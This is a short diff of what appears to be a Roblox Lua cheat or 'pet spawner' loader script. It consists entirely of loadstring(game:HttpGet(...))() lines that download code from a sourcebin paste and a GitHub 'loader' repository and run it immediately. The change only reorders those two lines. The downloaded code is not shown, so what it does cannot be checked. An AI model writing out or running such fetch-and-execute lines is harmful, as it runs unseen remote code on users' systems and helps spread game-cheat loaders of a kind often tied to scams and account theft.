@@ -1,3 +1,2 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/KEWVRNIsod/0", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryikazu/loader/refs/heads/main/petspawner.lua"))()
-
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/KEWVRNIsod/0", true))()
